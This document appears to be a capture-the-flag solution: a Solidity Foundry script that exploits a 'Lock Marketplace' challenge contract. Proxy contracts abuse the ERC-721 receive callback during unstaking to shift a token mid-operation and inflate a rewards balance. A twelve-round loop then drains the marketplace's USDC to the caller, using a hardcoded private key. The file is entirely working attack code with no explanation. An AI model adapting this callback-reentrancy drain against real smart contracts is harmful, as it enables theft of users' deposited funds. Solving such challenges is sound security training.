# Lockdown

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "src/interfaces/ILockMarketplace.sol";
import "src/interfaces/ILockToken.sol";
import "src/interfaces/ICERC20.sol";
import "src/interfaces/IComptroller.sol";

interface IChallenge {
    function USDC() external returns (IERC20);
    function CUSDC() external returns (IERC20);
    function COMPTROLLER() external returns (IComptroller);
    function LOCK_MARKETPLACE() external returns (ILockMarketplace);
    function LOCK_TOKEN() external returns (ILockToken);
}

contract Proxy {
    uint256 mode;
    IChallenge public chal;
    ILockMarketplace public m;
    ILockToken public t;
    IERC20 usdc;
    address a;
    address b;
    address c;
    uint160 i;
    uint256 lastTokenId;
    
    constructor(IChallenge _chal) {
        chal = _chal;
        m = chal.LOCK_MARKETPLACE();
        t = chal.LOCK_TOKEN();
        usdc = chal.USDC();
    }

    function mintWithUSDC(address to, uint256 usdcAmount) external returns (uint256) {
        usdc.approve(address(m), usdcAmount);
        return m.mintWithUSDC(to, usdcAmount);
    }

    function stake(uint256 tokenId, uint256 usdcAmount) external {
        t.approve(address(m), tokenId);
        return m.stake(tokenId, usdcAmount);
    }

    function unStake(address to, uint256 tokenId) external {
        return m.unStake(to, tokenId);
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        t.transferFrom(from, to, tokenId);
    }

    function set_mode(uint256 _mode) external {
        mode = _mode;
    }

    function set_addr_a(address addr) external {
        a = addr;
    }

    function set_addr_b(address addr) external {
        b = addr;
    }

    function set_addr_c(address addr) external {
        c = addr;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        if (mode == 1) {
            t.transferFrom(address(this), c, tokenId);
            Proxy(c).transferFrom(address(c), a, tokenId);
        }
        lastTokenId = tokenId;
        return this.onERC721Received.selector;
    }

    function claim() external {
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));

        i += 1;
        t.transferFrom(address(this), address(uint160(address(this)) + i), lastTokenId);
    }

    function withdrawUSDC(uint256 tokenId, uint256 amount) external {
        m.withdrawUSDC(tokenId, amount);
    }

    function redeemCompoundRewards(uint256 tokenId, uint256 rewardAmount) external {
        m.redeemCompoundRewards(tokenId, rewardAmount);
    }
}

contract Exploit {
    IChallenge public chal;
    ILockMarketplace public m;
    IERC20 public usdc;
    IERC20 public cusdc;
    Proxy public a;
    Proxy public b;
    Proxy public c;

    constructor(IChallenge _chal) {
        chal = _chal;
        m = chal.LOCK_MARKETPLACE();
        usdc = chal.USDC();
        cusdc = chal.CUSDC();

        a = new Proxy(_chal);
        b = new Proxy(_chal);
        c = new Proxy(_chal);

        b.set_addr_a(address(a));
        b.set_addr_c(address(c));

        c.set_addr_a(address(a));
        c.set_addr_b(address(b));
    }

    function pwn() external {
        uint256 amount_1;
        uint256 amount_2;
        uint256 tokenId;
        uint256 tokenId2;
        uint256 tokenId3;
        uint256 c_rewards;
        uint256 m_balance;
        uint256 c_deposit;

        for (uint256 i = 0; i < 12; i++) {
            console.log("i", i);

            amount_1 = usdc.balanceOf(address(this)) - 100e6;
            if (i == 11)
                amount_1 = 364921e6 + 101e6;
            amount_2 = 100e6;

            console.log("amount_1", amount_1/1e6);

            usdc.transfer(address(a), amount_1);
            usdc.transfer(address(b), amount_2);

            tokenId = a.mintWithUSDC(address(a), amount_1);
            a.stake(tokenId, amount_1 - 20e6);

            tokenId2 = b.mintWithUSDC(address(b), amount_2);
            b.stake(tokenId2, amount_2 - 20e6);
            b.set_mode(1);
            b.unStake(address(b), tokenId2);
            b.set_mode(0);

            a.transferFrom(address(a), address(b), tokenId2);
            b.withdrawUSDC(tokenId2, m.getDeposit(tokenId2));
            b.claim();

            a.unStake(address(a), tokenId);
            a.withdrawUSDC(tokenId, m.getDeposit(tokenId));
            a.claim();

            // c should have inflated _rewardsBalance
            c_rewards = m.getAvailableRewards(address(c));
            console.log("_rewardsBalance[c]", c_rewards/1e6);

            usdc.transfer(address(c), amount_2);
            tokenId3 = c.mintWithUSDC(address(c), amount_2);
            c_deposit = m.getDeposit(tokenId3);
            if (c_deposit != 0)
                c.withdrawUSDC(tokenId3, c_deposit);
            m_balance = usdc.balanceOf(address(m));
            if (m_balance != 0)
                c.redeemCompoundRewards(tokenId3, c_rewards > m_balance ? m_balance : c_rewards);
            c.claim();

            console.log("balanceOf(this)", usdc.balanceOf(address(this))/1e6);
            console.log("usdc.balanceOf(m)", usdc.balanceOf(address(m))/1e6);
            console.log("cusdc.balanceOf(m)", cusdc.balanceOf(address(m)));
            console.log("cusdc.balanceOf(m) < 0.01e18", cusdc.balanceOf(address(m)) < 0.01e18);
        }

        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }
}

contract ExploitScript is Script {
    uint256 public privateKey = 0x264dc4c5e6f74aa75583dd3e7f8784e072511ab505012e43f8bef980174b6467;
    IChallenge public chal = IChallenge(0xb5284fE2119E23c672A80Ac11B05c67D3c072eAf);

    function setUp() public {}

    function run() public {
        vm.startBroadcast(privateKey);
        Exploit e = new Exploit(chal);
        chal.USDC().transfer(address(e), 500e6);
        e.pwn();
        vm.stopBroadcast();
    }
}
```
